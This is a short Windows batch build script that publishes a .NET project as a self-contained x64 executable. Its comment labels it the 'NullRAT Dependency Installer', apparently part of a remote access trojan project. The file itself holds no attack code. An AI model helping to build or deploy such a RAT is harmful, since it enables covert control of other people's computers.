@echo off

:: Publish NullRAT Dependency Installer -> NATIVE
:: for Windows x64 | Self Contained & Trimmed
dotnet publish "Dependencies.csproj" --output build\ -r win-x64 -c release --self-contained true